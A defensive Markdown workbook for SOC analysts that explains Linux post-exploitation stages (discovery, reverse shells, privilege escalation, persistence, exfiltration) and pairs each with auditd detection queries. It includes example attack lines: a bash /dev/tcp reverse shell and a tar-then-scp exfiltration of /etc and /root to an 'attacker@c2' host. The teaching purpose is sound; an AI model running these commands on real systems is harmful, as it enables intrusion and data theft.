# 🛡️ SOC Workbook – Linux Threat Detection (End-to-End Playbook)

This workbook documents how threat actors operate on Linux systems **after initial access** and how SOC analysts can **detect, investigate, and reconstruct full attack chains** using `auditd`, authentication logs, process trees, and network telemetry.

This covers:
- Discovery
- Reverse shells
- Privilege escalation
- Persistence
- Collection & Exfiltration
- Internal network scanning
- Real-world malware tradecraft (cryptominers, backdoors)

---

## 🎯 Objectives

- Understand attacker behavior on Linux hosts
- Detect post-exploitation activity
- Reconstruct attack chains from logs
- Build SOC detection playbooks
- Eliminate Linux blind spots in enterprise environments

---

# 1️⃣ Discovery Phase – Understanding the Compromised Host

After initial access, attackers run Discovery commands to answer:
- Who am I?
- What system is this?
- What data exists?
- What security tools are present?
- Can I escalate privileges?

Discovery is:
- Command-heavy
- Short bursts of commands
- Almost always precedes further attack stages

---

## 🗂️ OS & Filesystem Discovery

### `pwd`

**What it does:** Prints the current working directory.

**Why attackers use it:**
Reveals whether they landed in restricted directories like `/var/www/html`, a jailed shell, or a normal user directory.

**SOC detection:**
Look for `pwd` executed by service accounts such as `www-data`.

---

### `ls /`

**What it does:** Lists root filesystem directories.

**Why attackers use it:**
Reveals system layout and whether the host looks like a container, VM, or full server.

**SOC detection:**
```bash
ausearch -i -x ls
```

---

### `env`

**What it does:** Prints environment variables.

**Why attackers use it:**
Environment variables may leak:
- Credentials
- Tokens
- Cloud metadata
- Execution context

---

### `uname -a`

**What it does:** Prints kernel version and OS details.

**Why attackers use it:**
Attackers use kernel version to select privilege escalation exploits.

---

### `lsb_release -a`

**What it does:** Prints Linux distribution details.

**Why attackers use it:**
Different distros have different vulnerabilities.

---

### `hostname`

**What it does:** Prints system hostname.

**Why attackers use it:**
Hostnames often reveal:
- Server purpose
- Environment (prod, dev)
- Naming conventions

---

## 👤 User & Group Discovery

### `id`

**What it does:** Shows UID, GID, and groups.

**Attacker value:**
Identifies privilege level and abuse potential.

---

### `whoami`

**What it does:** Quick privilege check.

---

### `w`

**What it does:** Shows active user sessions.

**Attacker value:**
Identifies human users for credential theft.

---

### `last`

**What it does:** Login history.

**Attacker value:**
Finds admins and usage patterns.

---

### `cat /etc/passwd`

**What it does:** Lists all users.

**Attacker value:**
Finds human accounts, service accounts, misconfigurations.

---

### `cat /etc/sudoers`

**What it does:** Shows sudo permissions.

**Attacker value:**
Finds passwordless sudo and misconfigurations.

---

## 🔎 Process & Network Discovery

### `ps aux`

**What it does:** Lists all running processes.

**Attacker value:**
Finds:
- EDR
- SIEM agents
- Databases
- Backups

---

### `top`

**What it does:** Live process monitoring.

**Attacker value:**
Detects security tools and crypto miners.

---

### `ip a`

**What it does:** Lists network interfaces.

**Attacker value:**
Reveals internal IP ranges.

---

### `ip r`

**What it does:** Routing table.

**Attacker value:**
Shows internal network paths.

---

### `arp -a`

**What it does:** Lists neighbors.

**Attacker value:**
Finds lateral movement targets.

---

### `ss -tnlp` / `netstat -tnlp`

**What it does:** Shows listening services.

**Attacker value:**
Finds SSH, databases, admin panels.

---

## ☁️ Sandbox / VM Detection

### `systemd-detect-virt`

**What it does:** Detects virtualization.

**Attacker value:**
Avoids sandboxes.

---

### `lsmod`

**What it does:** Lists kernel modules.

**Attacker value:**
Finds security drivers.

---

# 2️⃣ Reverse Shells – Stabilizing Access

Web shells are unreliable. Attackers establish reverse shells.

## Bash Reverse Shell

```bash
bash -i >& /dev/tcp/10.10.10.10/1337 0>&1
```

**What happens:**
Victim initiates outbound connection and spawns bash.

**SOC Detection:**
- Bash making outbound connections
- `auditd` process logs
- Network egress to unknown IPs

---

# 3️⃣ Privilege Escalation

## Typical Attack Pattern

1. Discovery
2. Download exploit to `/tmp`
3. Compile exploit
4. Execute exploit
5. UID changes to root

## SOC Detection

- `wget` into `/tmp`
- `gcc` on servers
- UID change from service user to root

---

# 4️⃣ Persistence

## Cron Jobs

Attackers schedule malware on reboot.

**Detection:**
```bash
ausearch -i -x crontab
ausearch -i -f /etc/cron.d
```

---

## systemd Services

Attackers register fake services.

**Detection:**
```bash
ausearch -i -f /etc/systemd/system
ausearch -i -x systemctl
```

---

## SSH Key Backdoors

Attackers add SSH keys to `authorized_keys`.

**Detection:**
```bash
ausearch -i -f authorized_keys
```

---

# 5️⃣ Collection & Exfiltration

### Archive sensitive files

```bash
tar czf dump.tar.gz /etc /root
```

### Exfiltrate stolen data

```bash
scp dump.tar.gz attacker@c2:~
```

**SOC Detection:**
- SCP usage
- Large outbound transfers
- Connections to unknown hosts

---

# 🧠 SOC Analyst Final Playbook

| Phase | Detection |
|---|---|
| Discovery | Command bursts |
| Reverse Shell | Bash/python/socat + outbound traffic |
| PrivEsc | `/tmp` + `gcc` + UID change |
| Persistence | `cron`/`systemd`/`authorized_keys` changes |
| Exfiltration | `tar` + `scp` |
